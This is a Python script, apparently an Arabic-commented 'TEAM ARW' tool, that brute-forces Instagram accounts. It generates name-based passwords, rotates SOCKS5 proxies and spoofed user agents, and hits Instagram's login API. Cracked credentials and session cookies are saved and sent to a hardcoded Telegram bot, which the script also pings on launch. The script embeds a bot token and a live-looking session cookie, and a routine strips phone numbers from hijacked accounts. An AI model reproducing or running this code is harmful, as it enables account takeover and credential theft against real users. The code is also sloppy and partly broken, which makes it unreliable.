from datetime import datetime

# تحديد تاريخ انتهاء الصلاحية (مثال: 1 أكتوبر 2025 الساعة 12:00)
end_date = "2025-10-01 12:00:00"

# تحويل التاريخ إلى كائن datetime
end_datetime = datetime.strptime(end_date, "%Y-%m-%d %H:%M:%S")

# التحقق من التاريخ الحالي
current_datetime = datetime.now()

if current_datetime >= end_datetime:
    print("OK.")
else:
    print("error.")
    # يمكن هنا تنفيذ باقي الكود
import os
import re
import sys
import uuid
import time
import random
import hashlib
import requests
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor, as_completed

import os
import sys
import time
import random
import requests
import uuid
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
token= '7547526933:AAHn5sTRbesNnb_e2EcKCzDc8LSqGbH8r_M'
ID = '7327921791'
# إزالة الرموز 
requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=تم رصد عملية دخول-✵  ').text

import urllib.parse
from urllib.parse import quote
import re, os, sys, json, random, urllib, urllib.request, hmac, hashlib, time, string, uuid, requests, base64,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich.progress import Progress,TextColumn,SpinnerColumn
from string import *
xx = 0
rr = random.randint;rc = random.choice

Uid, Uuid = [], []
Ok, Cp, Loop = 0, 0, 0
P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = "\033[33m"

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
Ha = "[#78FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
Na = "[#ff0033]" # PINK

M = '' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
# إزالة الرموز التعبيرية
P = "\033[97m"
console = Console()
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
Ha = "[#78FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
Na = "[#ff0033]" # PINK

M = '' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
# إزالة الرموز التعبيرية
P = "\033[97m"
import os,time
import re
import sys
import uuid
import random
import hashlib
import requests
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor, as_completed

# وظيفة تنظيف الملف


import os
import json
import random
import requests
import time
from rich.console import Console

console = Console()

# Console for styled text
console = Console()

# Constants


def clear_screen():
    """Clear the console screen."""
    os.system("cls" if os.name == "nt" else "clear")


def Clear():
    try:os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
    except:pass
#33,

import os
os.system("clear")
GG="\033[1;32m"
BB="\033[1;34m"
YY="\033[1;33m"
PP="\033[1;35m"
CC="\033[1;36m"


import requests
import bs4
from rich.console import Console

console = Console()

def cek_DYNO(user, cookie_string):
    session = requests.Session()

    # تحويل الكوكيز من النص إلى شكل قاموس
    try:
        cookies = {cookie.split('=')[0]: cookie.split('=')[1] for cookie in cookie_string.split('; ')}
    except Exception as e:
        print(f"حدث خطأ أثناء معالجة الكوكيز: {e}")
        return

    # زيارة صفحة الملف الشخصي في Instagram باستخدام اسم المستخدم
    url = f"https://www.instagram.com/{user}/"
    try:
        w = session.get(url, cookies=cookies).text
        sop = bs4.BeautifulSoup(w, "html.parser")

        # استخراج عدد المتابعين من الميتا تاج
        followers_count = sop.find('meta', property='og:description')['content']
        followers_count = followers_count.split(' ')[0]  # استخراج الرقم فقط

        # استخراج الاسم الكامل من الميتا تاج
        full_name = sop.find('meta', property='og:title')['content']
        full_name = full_name.split('•')[0].strip()  # استخراج الاسم الكامل قبل "•"

        console.print(f"\r\n[bold yellow]           ➛ followers : {B2}{followers_count}.     ✓\n[bold yellow]           ➛ full name : {B2}{full_name}.     ✓\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")
    except Exception as e:
        console.print(f"\r [red]  Error: {e}")

# كيفية الاستخدام:
cookie_string = "datr=la91ZyugolYjsOk_hS3WaceC; ig_did=084282CC-A90C-498B-892B-DF0AD63ACE6C; dpr=1.6687500476837158; mid=Z3WvlgABAAF4Fvz0eROdgBTWK2n7; ig_nrcb=1; ps_l=1; ps_n=1; wd=432x887; csrftoken=Etc4PgAK7iXgwRmenNeV4Lk6tDJZRVtP; ds_user_id=48416624176; sessionid=48416624176%3A2s6vuaL1AIvUjR%3A27%3AAYfYXCYW_0aIUViuAsmaR4qQF5T3rxK0cG3cGg_WKw; rur=\"LDC\\05448416624176\\0541767339582:01f7f0aec9ec28858359a3d976e6222c32609ee06a873ad4909c27bb59f9e9e80d015a40\""



# كيفية الاستخدام:

def Menu():
    """Display the main menu."""
    clear_screen()

    while True:
        clear_screen()

        
        Console().print(f"""\033{Na}

                          _______________
                        {B2}𖣘 < 𝐓𝐄𝐀𝐌 <-✵-> 𝐀𝐑𝐖 > 𖣘 𝚅3.-
                     """)
        # Check for saved cookies status
        print('''
\033[1;34m         **************************************************\n
\033[1;35m       ____𓆩𝙰𝚝𝚎𝚏 𝙱𝚎𝚗 𝙰𝚖𝚘𝚛 & 𝚁𝚊𝚢𝚎𝚗 𝙶𝚊𝚖𝚘𝚞𝚍𝚒 & 𝚆𝚒𝚜𝚜𝚎𝚖 𝙰𝚔𝚘𝚞𝚍𝚒𓆪____\n
\033[1;33m                  ____𝐖𝐞𝐥𝐥 𝐂𝐨𝐦𝐞 𝐓𝐨 𝐓𝐄𝐀𝐌 <✵> 𝐀𝐑𝐖 ____
\n\033[1;00m''')

        Console().print(f"\n {P2}[{H2}✵{P2}] 𝐂𝐨𝐨𝐤𝐢𝐞𝐬 :_-- {H2}𝚅3 \n")
        
        Console().print(f'\n [1]. 𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠 𝐅𝐫𝐨𝐦 𝐅𝐢𝐥𝐞\n')
        Console().print(f'\n [2]. 𝐃𝐮𝐦𝐩 𝐅𝐢𝐥𝐞 𝐋𝐢𝐬𝐭 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 (soon)\n')
        choice = Console().input(' [?]   ➛  ')
    
        if choice == "1":
            brute.file()
        elif choice == "2":
            console.print("برا نيك اصبر")
            time.sleep(2)
            Menu()  
        else:
            console.print("[bold red]Invalid choice, try again.")
            return Menu()  






#🍀🍀22🍀🍀🍀🍀🍀🍀h
import re, requests, json, random, time, urllib, uuid, hashlib, os, sys, base64
import urllib, hmac, string
import re
from rich.tree import Tree
from rich import print as printf
from rich.console import Console
from rich.panel import Panel as Pan
from datetime import datetime
from bs4 import BeautifulSoup as bsp
from rich.panel import Panel
from rich import print as prints
from rich.table import Table
from rich.console import Console
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor as executor
import os
import sys
import time
import random
import requests
import uuid
from rich.console import Console
from rich.progress import Progress, BarColumn, TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock  # لإدارة التزامن

console = Console()
lock = Lock()  # قفل لضمان كتابة الملفات بأمان

import random

class Require:
    def __init__(self):
        self.one = []

    def Password(self, fullname):
        self.one = []  # إعادة تعيين القائمة

        # تقسيم الاسم الكامل إلى أجزاء
        names = fullname.split(' ')

        # التعامل مع الأسماء الثنائية
        if len(names) == 2:
            first_name = names[0].lower()  # الاسم الأول
            last_name = names[1].lower()  # الاسم الأخير

            # توليد كلمات المرور
            self.one.append(first_name + '123')             
            self.one.append(first_name + '1234')            
            self.one.append(first_name + '12345')      
            self.one.append(first_name + '123456')
            self.one.append(first_name + '1234567')   
            self.one.append(first_name + '12')   
            self.one.append(first_name + '123456789')   
            self.one.append(first_name + '123123') 
            self.one.append(first_name.capitalize() + '123')
            self.one.append(first_name.capitalize() + '12345')
            self.one.append(first_name.capitalize() + '123456')
            self.one.append(first_name.capitalize() + '1234')
            self.one.append(first_name.capitalize() + '1234567')
            self.one.append(first_name + first_name)
        # التعامل مع الأسماء الثلاثية
        elif len(names) == 3:
            first_name = names[0].lower()  # الاسم الأولn
            last_name = names[1].lower()  

            # توليد كلمات المرور
            self.one.append(first_name + '123')             
            self.one.append(first_name + '1234')            
            self.one.append(first_name + '12345')      
            self.one.append(first_name + '123456')
            self.one.append(first_name + '1234567')   
            self.one.append(first_name + '12')   
            self.one.append(first_name + '123456789') 
            self.one.append(first_name + '123123') 
            self.one.append(first_name.capitalize() + '123')
            self.one.append(first_name.capitalize() + '12345')
            self.one.append(first_name.capitalize() + '123456')
            self.one.append(first_name.capitalize() + '1234')
            self.one.append(first_name.capitalize() + '1234567')
            self.one.append(first_name + first_name)
            self.one.append(first_name.capitalize() + '12')

        # خلط القائمة بشكل عشوائي
        random.shuffle(self.one)

        # إرجاع القائمة
        return self.one
    def Signature(self, data, body='SIGNATURE'):
        return 'signed_body={}.{}&ig_sig_key_version=4'.format(body, urllib.parse.quote_plus(data))

    def DeviceId(self):
        return 'android-%s'%(self.uuid_(True)[:16])

    def uuid_(self, abcd=None, zd=None):
        if zd is not None:
           m = hashlib.md5()
           m.update(zd.encode('utf-8'))
           i = uuid.UUID(m.hexdigest())
        else:
           i = uuid.uuid4()
           if abcd: return str(i.hex)
        return str(i)

    def adid(self, username):
        sha2 = hashlib.sha256()
        sha2.update(username.encode('utf-8'))
        abcd = sha2.hexdigest()
        return self.uuid_(False, abcd)

    def guid(self):
        return self.uuid_(False)

    def poid(self):
        return self.uuid_(False, self.guid())

    def socks(self, item = []):
        if os.path.isfile('data/termux/internal/proxies.txt') is True:
           return(open('data/termux/internal/proxies.txt','r').read().splitlines())
        else:
           try:
               resp = requests.get('https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt')
               for i in resp.text.splitlines():
                   if i.isdigit:
                      if i not in item:
                         item.append(i)
                         open('data/termux/internal/proxies.txt','a').write(f'{i}\n')
               return item
           except requests.exceptions.ConnectionError as e:
               time.sleep(5) ; self.socks()

    def vers(self):
        igv = ("100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119")
        igve = igv.split(",")
        versi = random.choice(igve)
        return versi
        		
    def UserAgent(self):
        rr = random.randint
        rc = random.choice    
        andro = rc(['23/6.0.1','24/7.0','22/5.1.1','26/8.0.0','17/4.2.2','19/4.4.2','25/7.1.1','21/5.0','28/9']) 
        dpis = rc(['640dpi','320dpi','480dpi','560dpi','240dpi']) 
        pxl = rc(['1440x2560','720x1280','1080x1920','1440x2792','480x800','1080x2076','1440x2768','720x1384','1080x2094']) 
        basa = rc(['pt_PT','ru_RU','fr_CA','uk_UA','de_DE','hu_HU','ru_UA','en_US']) 
        basi = rc(['qcom','samsungexynos8890']) 
        kode = rc(['98288242','99640911','99640905','99640911','102221279','117539695','98288239','144612598','143631574','127049003','126223520','94080603','96794590','90841939']) 
        igv = ("134.0.0.26.121,87.0.0.18.99,116.0.0.34.121,27.0.0.11.97,110.0.0.16.119,133.0.0.32.120,123.0.0.21.114,128.0.0.26.128,124.0.0.17.473,129.0.0.29.119,133.0.0.32.120,48.0.0.15.98,44.0.0.9.93,131.0.0.25.116,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,133.0.0.32.120,124.0.0.17.473,129.0.0.29.119,23.0.0.14.135,40.0.0.14.95,80.0.0.14.110,128.0.0.26.128,20.0.0.29.75,111.1.0.25.152,80.0.0.14.110,125.0.0.20.126,111.1.0.25.152,132.0.0.26.134,97.0.0.32.119,24.0.0.12.201,22.0.0.17.68,93.1.0.19.102,54.0.0.26.138,43.0.0.29.150,120.0.0.25.141,122.0.0.29.238,131.0.0.25.116,127.0.0.30.121") 
        igve = igv.split(",")     
        versi = rc(igve)        
        kntlgoreng = rc(["trlte"]) 
        redmis = rc(["SM-N910F"]) 
        return(f'''Instagram {versi} Android ({andro}; {dpis}; {pxl}; samsung; {redmis}; {kntlgoreng}; {basi}; {basa}; {kode})''')
        
    
        
    def GetPhone(self, cookie, status = {}):
        try:
            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies = {'cookie':cookie}).text
            head = self.headers_graph(resp)
            head.update({
               'Host': 'accountscenter.instagram.com',
               'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)',
               'x-fb-friendly-name': 'FXAccountsCenterContactPointRootQuery'})
            data = self.data_graph(resp)
            data.update({
               'fb_api_req_friendly_name':'FXAccountsCenterContactPointRootQuery',
               'variables':json.dumps({"interface":"IG_WEB"}),
               'doc_id':'6253939098058154'
            })
            xnxx = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {'cookie':cookie}).text
            if '"all_contact_points"' in str(xnxx):
                pone = re.search('{"contact_point_type":"PHONE_NUMBER","normalized_contact_point":"(.*?)"', str(xnxx)).group(1)
                head.update({'x-fb-friendly-name': 'FXAccountsCenterDeleteContactPointMutation'})
                data.update({
                    'fb_api_req_friendly_name':'FXAccountsCenterDeleteContactPointMutation',
                    'variables':json.dumps({"normalized_contact_point":pone,"contact_point_type":"PHONE_NUMBER","selected_accounts":[f"{self.AccountId(resp)}"],"client_mutation_id":"mutation_id_1700749992848","family_device_id":"device_id_fetch_ig_did"}),
                    'doc_id':'6716611361758391'
                })
                haps = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {'cookie':cookie}).text
                if '"success":false' in haps:status.update({'Dihapus':False,'Number':pone})
                else:status.update({'Dihapus':True,'Number':pone})
            else:pass
        except Exception as e:
            status.update({'Dihapus':False,'Number':'None'})
        return(status)

class Brute:
    
    def __init__(self):
        self.tw, self.ok, self.cp, self.id, self.lp = 0, 0,0, [], 0
        self.head = {'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)',}
        self.param = {'count': '200','max_id': 'JhonChenXU','search_surface': 'follow_list_page'}
        self.dire = 'data/termux/internal'
        self.ipp = requests.get("https://api.ipify.org/?format=json").json()["ip"]

    def Clear(self):
        try:os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        except:pass

    def file(self):
        try:
            file_path = input('\n\033[1;37m 𝚏𝚒𝚕𝚎 𝙻𝚘𝚌𝚊𝚝𝚘𝚒𝚗  \033[1;37m : ')
            file = open(file_path, 'r').read()
        except Exception as e:
            Console().print(f' P2[M2!P2] Opshh terjadi kesalahan: {str(e)}')
            exit()
        for res in file.splitlines():
            try:
                user, pswd = res.split('|')[0], res.split('|')[1]
                formatusr = '%s|%s' % (user, pswd)
                if formatusr not in self.id:
                    self.id.append(formatusr)
            except IndexError:
                continue
        Console().print(f'')
        self.methode()

    def methode(self):

        xyz = '1'
        yxz = 'n'
        self.exec_malink(xyz, yxz)
    
    def exec_malink(self, methode_login, xontolmek):


        Console().print(f'\n {M2}[{H2}+{M2}] {Na} 𝚆𝚊𝚒𝚝𝚒𝚗𝚐 \n')
        with executor(max_workers=25) as bol:
           for kontol in self.id:
               username, nama = kontol.split('|')
               password = Require().Password(nama)
               showdate = True if xontolmek in ('ya','y') else None
               if methode_login in ('1','01'):bol.submit(self.api_vjs, username, password,showdate)

        print('\n')
        Console().print(f' {P2}[{H2}*{P2}]  OK : {H2}{self.ok}\n {P2}[{H2}*{P2}]  CP : {K2}{self.cp}') ; Console().print(f' {P2}[{H2}+{P2}] {B2}{len(self.id)}{P2} username\n\n')
        __import__('os').remove('data/termux/internal/proxies.txt') ; sys.exit(0)


    def api_vjs(self, user, password, allData_akun=None, file='data/termux/internal/'):
        requ = Require()
        prox = requ.socks()
        byps = requests.Session()
        kont = random.randint
        uaig = requ.UserAgent()
        Console().print(f' {B2}[{H2}+{B2}] 𝐓𝐄𝐀𝐌 <✵> 𝐀𝐑𝐖 𝚅3 : {H2}   ➛  {P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
        for pswd in password:
            try:
                 resp = byps.get('https://www.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
                 prok = {'http': 'socks5://' + random.choice(prox)}
                 data = json.dumps(
                    {
                       'phone_id': requ.poid(),
                       'device_id': requ.DeviceId(),
                       'guid': requ.guid(),
                       'username': user,
                       'password': pswd
                    }
                 )
                 headers = {
                     'Authority': 'api.instagram.com',
                     'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                     'X-IG-Connection-Speed': f'{random.randint(100, 999)}kbps',
                     'Accept': '*/*',
                     'X-IG-Connection-Type': random.choice(['MOBILE(LTE)', 'WIFI']),
                     'X-IG-App-ID': '936619743392459',
                     'Accept-Language': 'id-ID',
                     'X-IG-ABR-Connection-Speed-KBPS': '0',
                     'User-Agent': uaig,
                     'Connection': 'keep-alive',
                     'X-IG-Capabilities': '36r/dw==',
                     'Cookie': f'csrftoken={resp.cookies.get("csrftoken")};mid={resp.cookies.get("mid")};dpr=2'
                 }
                 cookies = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                 byps.headers.update({'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
                 resp_data = requ.Signature(data)
                 response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = resp_data, headers = headers, cookies = {'cookie':cookies}, proxies = prok)
                 if 'logged_in_user' in str(response.text):
                       self.ok +=1
                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])

                       if allData_akun is not None:
                          try:
                              
                              print('\r                                                                     ')
                              
                          except Exception as e:
                                 print('\r                                                                        ')
                                 
                       else:                            
                        # استخدام القفل أثناء الكتابة
                        with lock:
                            open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-OK.txt', 'a').write(f'{user}|{pswd}\n{cookie}\n')
                            console.print(f"\r [bold green]         𖣘─────────────────━﴾𓆩OK𓆪﴿━─────────────────𖣘            \n[bold green]           ├ {user} | {pswd}\n[bold green]           ├ OK:{B2} {self.ok}\n[bold green][🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──>{B2} {cookie}\n")
                            cek_DYNO(user, cookie_string)
                            requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ OK- : '+user+' ׀ '+pswd))

                            break

                
                 elif 'two_factor_required' in str(response.text):
                    self.tw += 1

                    console.print(f"\r {M2}         𖣘─────────────────━﴾𓆩A2F𓆪﴿━─────────────────𖣘            \n{M2}           ├ {user} | {pswd}\n{M2}           ├ A2F:{B2} {self.tw}\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")
                    break
                 elif 'https://i.instagram.com/challenge/' in str(response.text):

                    self.cp += 1
                    open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-CP.txt', 'a').write(f'{user}|{pswd}\n')
                    console.print(f"\r {K2}         𖣘─────────────────━﴾𓆩CP𓆪﴿━─────────────────𖣘            \n[bold yellow]           ├ {user} | {pswd}\n[bold yellow]           ├ CP:{B2} {self.cp}\n")
                    requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ CP- : '+user+' ׀ '+pswd))
                    cek_DYNO(user, cookie_string)
                    break

            except requests.exceptions.ConnectionError as e:
               time.sleep(10) ; self.api_vjs2(user, password, allData_akun, file='data/termux/internal/')
        self.lp +=1


if __name__ == "__main__":
    try:
        # تحديد المسارات
        main_folder = '/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦'
        accounts_folder = os.path.join(main_folder, 'حسابات Ok-CP')
        list_folder = os.path.join(main_folder, '')
        
        # التحقق من وجود المجلدات وإنشائها إذا لم تكن موجودة
        if not os.path.exists(accounts_folder):
            os.makedirs(accounts_folder)
        
        if not os.path.exists(list_folder):
            os.makedirs(list_folder)

        # إنشاء الملفات فقط إذا لم تكن موجودة
        if not os.path.exists(os.path.join(accounts_folder, 'حسابات-OK.txt')):
            with open(os.path.join(accounts_folder, 'حسابات-OK.txt'), 'w') as file:
                file.write("")

        if not os.path.exists(os.path.join(accounts_folder, 'حسابات-CP.txt')):
            with open(os.path.join(accounts_folder, 'حسابات-CP.txt'), 'w') as file:
                file.write("")


        print("")

    except Exception as e:
        print(f"حدث خطأ : {e}")
    
    # استكمال العمل بعد إنشاء المجلدات والملفات
    brute = Brute()  # كائن من الفئة Brute
    Menu()           # عرض القائnnمjjة أو nتنفيذ الخياراتgh
    
    #bhgوتyyyتتتتناتتjjhhhhyاتتااا,😙𝚑𝚑😋gbhj
